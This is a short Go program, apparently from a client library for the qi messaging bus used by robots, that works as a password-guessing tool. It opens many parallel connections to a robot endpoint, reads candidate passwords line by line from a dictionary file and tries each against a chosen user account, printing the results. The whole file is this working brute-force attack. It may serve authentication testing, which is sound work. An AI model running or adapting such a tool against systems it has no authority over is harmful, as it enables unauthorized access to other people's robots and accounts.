package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"sync"

	"github.com/lugu/qiloop/bus"
	"github.com/lugu/qiloop/bus/net"
)

type tester struct {
	endpoint    net.EndPoint
	user, token string
}

func (t tester) test() error {
	return bus.AuthenticateUser(t.endpoint, t.user, t.token)
}

func main() {
	var serverURL = flag.String("qi-url", "tcps://robot:9503",
		"server address")
	var width = flag.Int("width", 200, "number of parrallel connections")
	var dictionnary = flag.String("dict", "dictionnary.txt", "dictionary file")
	var user = flag.String("user", "", "auth user")

	flag.Parse()

	if *dictionnary == "" {
		log.Fatalf("missing dictionnary parameter")
	}
	file, err := os.Open(*dictionnary)
	if err != nil {
		log.Fatalf("failed to open %s: %s", *dictionnary, err)
	}

	defer file.Close()
	r := bufio.NewReader(file)

	testers := make([]tester, *width)

	// 1. establish N connections
	for i := 0; i < *width; i++ {
		password, err := r.ReadString('\n')
		if err != nil {
			log.Fatalf("failed to read password: %s", err)
		}

		println("connecting... ", i)
		endpoint, err := net.DialEndPoint(*serverURL)
		if err != nil {
			log.Fatalf("failed to contact %s: %s", *serverURL, err)
		}

		testers[i] = tester{
			endpoint: endpoint,
			user:     *user,
			token:    password,
		}
		// time.Sleep(5 * time.Second)
	}

	// 2. try N authentications in parrallel
	var wait sync.WaitGroup
	wait.Add(*width)
	for i := 0; i < *width; i++ {
		go func(t tester) {
			err := t.test()
			fmt.Printf("tester %s\n", err)
			wait.Done()
		}(testers[i])
	}
	println("waiting...")
	wait.Wait()
	println("done.")
}
